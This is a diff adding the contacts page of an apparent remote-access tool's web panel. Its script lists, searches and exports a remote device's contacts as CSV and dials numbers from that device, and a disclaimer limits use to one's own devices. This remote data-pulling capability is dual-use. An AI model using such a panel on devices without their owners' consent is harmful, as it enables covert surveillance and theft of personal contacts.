@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contacts - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <style>
+        .contact-card {
+            display: flex;
+            align-items: center;
+        }
+
+        .contact-card .info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .btn-contact-call {
+            background: #10b981;
+            color: #000;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            white-space: nowrap;
+            flex-shrink: 0;
+            transition: all 0.2s;
+        }
+
+        .btn-contact-call:hover {
+            background: #34d399;
+            transform: translateY(-1px);
+        }
+
+        @media (max-width: 480px) {
+            .btn-contact-call {
+                padding: 5px 10px;
+                font-size: 0.68rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&lt;-- Back to Dashboard</a>
+        <div class="header-row">
+            <h1>Contacts <span class="count-badge" id="contact-count" style="display:none">0</span></h1>
+            <button class="btn btn-primary" onclick="exportContacts()">EXPORT CSV</button>
+        </div>
+
+        <!-- Search bar -->
+        <div class="search-bar">
+            <input type="search" id="contact-search" placeholder="Search by name or number...">
+        </div>
+
+        <div id="contact-list" class="contact-list loading">Reading contacts...</div>
+
+        <!-- Pagination controls -->
+        <div id="pagination" class="pagination" style="display:none">
+            <button class="btn btn-secondary" id="prev-btn" onclick="prevPage()" disabled>&larr; PREV</button>
+            <span class="page-info" id="page-info">Page 1</span>
+            <button class="btn btn-secondary" id="next-btn" onclick="nextPage()">NEXT &rarr;</button>
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        var deviceId = new URLSearchParams(window.location.search).get('deviceId');
+
+        var PAGE_SIZE = 50;
+        var allContacts = [];
+        var currentPage = 1;
+        var hasMore = true;
+        var isLoading = false;
+        var searchTimeout = null;
+        var isSearchMode = false;   // true when showing search results
+        var searchQuery = '';
+
+        // --- Normal paginated fetch (no query) ---
+        async function fetchPage(offset) {
+            var response = await api.sendCommand(deviceId, 'contacts_list', {
+                limit: PAGE_SIZE,
+                offset: offset
+            });
+
+            if (response.success && response.data && response.data.status === 'success') {
+                var newContacts = response.data.data || [];
+                hasMore = response.data.hasMore || false;
+                return newContacts;
+            } else {
+                throw new Error(response.error || (response.data && response.data.error) || 'Failed to load contacts');
+            }
+        }
+
+        async function loadPage(page) {
+            if (isLoading) return;
+            isLoading = true;
+
+            var container = document.getElementById('contact-list');
+            container.className = 'contact-list';
+            container.innerHTML = '<div style="text-align:center;padding:40px;color:var(--primary)">&#x23F3; Loading page ' + page + '...</div>';
+
+            try {
+                var startIndex = (page - 1) * PAGE_SIZE;
+
+                if (startIndex >= allContacts.length && hasMore) {
+                    var newContacts = await fetchPage(allContacts.length);
+                    allContacts = allContacts.concat(newContacts);
+                    if (newContacts.length < PAGE_SIZE) hasMore = false;
+                }
+
+                currentPage = page;
+                var pageContacts = allContacts.slice(startIndex, startIndex + PAGE_SIZE);
+
+                document.getElementById('contact-count').style.display = 'inline-block';
+                document.getElementById('contact-count').textContent = allContacts.length + (hasMore ? '+' : '');
+
+                renderContacts(pageContacts);
+                updatePagination();
+            } catch (error) {
+                container.innerHTML = '<p style="color:var(--danger)">Error: ' + error.message + '</p>';
+            } finally {
+                isLoading = false;
+            }
+        }
+
+        // --- Server-side search (queries ALL contacts on device) ---
+        async function searchOnDevice(query) {
+            if (isLoading) return;
+            isLoading = true;
+            isSearchMode = true;
+            searchQuery = query;
+
+            var container = document.getElementById('contact-list');
+            container.className = 'contact-list';
+            container.innerHTML = '<div style="text-align:center;padding:40px;color:var(--primary)">&#x1F50D; Searching all contacts...</div>';
+
+            try {
+                var response = await api.sendCommand(deviceId, 'contacts_list', {
+                    limit: 200,
+                    offset: 0,
+                    query: query
+                });
+
+                if (response.success && response.data && response.data.status === 'success') {
+                    var results = response.data.data || [];
+
+                    document.getElementById('contact-count').style.display = 'inline-block';
+                    document.getElementById('contact-count').textContent = results.length + ' found';
+
+                    renderContacts(results);
+                    document.getElementById('pagination').style.display = 'none';
+                } else {
+                    throw new Error(response.error || (response.data && response.data.error) || 'Search failed');
+                }
+            } catch (error) {
+                container.innerHTML = '<p style="color:var(--danger)">Error: ' + error.message + '</p>';
+            } finally {
+                isLoading = false;
+            }
+        }
+
+        // --- Search handler with debounce ---
+        document.getElementById('contact-search').addEventListener('input', function () {
+            clearTimeout(searchTimeout);
+            var q = this.value.trim();
+
+            if (!q) {
+                // Cleared search - go back to normal paginated view
+                if (isSearchMode) {
+                    isSearchMode = false;
+                    searchQuery = '';
+                    var startIndex = (currentPage - 1) * PAGE_SIZE;
+                    document.getElementById('contact-count').textContent = allContacts.length + (hasMore ? '+' : '');
+                    renderContacts(allContacts.slice(startIndex, startIndex + PAGE_SIZE));
+                    updatePagination();
+                }
+                return;
+            }
+
+            searchTimeout = setTimeout(function () {
+                searchOnDevice(q);
+            }, 500);
+        });
+
+        function updatePagination() {
+            var pagination = document.getElementById('pagination');
+            var prevBtn = document.getElementById('prev-btn');
+            var nextBtn = document.getElementById('next-btn');
+            var pageInfo = document.getElementById('page-info');
+
+            pagination.style.display = 'flex';
+            prevBtn.disabled = currentPage <= 1;
+            nextBtn.disabled = !hasMore && currentPage >= Math.ceil(allContacts.length / PAGE_SIZE);
+
+            var showing = Math.min(currentPage * PAGE_SIZE, allContacts.length);
+            var from = (currentPage - 1) * PAGE_SIZE + 1;
+            pageInfo.innerHTML = 'Page ' + currentPage + ' <span style="opacity:0.5;font-size:0.8em">(' + from + '-' + showing + ')</span>';
+        }
+
+        function prevPage() {
+            if (currentPage > 1) loadPage(currentPage - 1);
+        }
+
+        function nextPage() {
+            loadPage(currentPage + 1);
+        }
+
+        function renderContacts(contacts) {
+            var container = document.getElementById('contact-list');
+            container.className = 'contact-list';
+
+            if (contacts.length === 0) {
+                container.innerHTML = '<div class="empty-state"><h2>No Contacts Found</h2><p>' +
+                    (isSearchMode ? 'No contacts match your search.' : 'No contacts found on device.') +
+                    '</p></div>';
+                return;
+            }
+
+            container.innerHTML = contacts.map(function (c) {
+                var callBtn = c.phones.length > 0
+                    ? '<button class="btn-contact-call" onclick="callContact(\'' + c.phones[0].replace(/'/g, "\\'") + '\')">&#x1F4DE; CALL</button>'
+                    : '';
+                return '<div class="contact-card">' +
+                    '<div class="avatar">' + c.name.charAt(0).toUpperCase() + '</div>' +
+                    '<div class="info"><h3>' + c.name + '</h3><p>' + c.phones.join(', ') + '</p></div>' +
+                    callBtn +
+                    '</div>';
+            }).join('');
+        }
+
+        async function callContact(number) {
+            try {
+                await api.sendCommand(deviceId, 'call_dial', { number: number });
+                api.showToast('Dialing ' + number + '...', 'success');
+            } catch (e) {
+                api.showToast('Dial failed: ' + e.message, 'error');
+            }
+        }
+
+        async function exportContacts() {
+            try {
+                var response = await api.sendCommand(deviceId, 'contacts_export', { format: 'csv' });
+
+                if (response.success && response.data && response.data.status === 'success') {
+                    api.downloadFile(deviceId, response.data.path);
+                    api.showToast('Exporting ' + response.data.count + ' contacts...', 'success');
+                } else {
+                    throw new Error(response.error || (response.data && response.data.error) || 'Export failed');
+                }
+            } catch (error) {
+                api.showToast(error.message, 'error');
+            }
+        }
+
+        // Auto-load first page on open
+        loadPage(1);
+    </script>
+
+    <!-- Disclaimer -->
+    <div class="container">
+        <div class="disclaimer">
+            <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely
+                manage their own devices. Installing or using this application on a device without the owner's explicit
+                consent is illegal and unethical. The developers assume no liability for misuse. By using this
+                application, you agree that you are solely responsible for how it is used.</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="site-footer">
+        <p class="footer-created">Created by</p>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
+        <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
+    </footer>
+</body>
+
+</html>
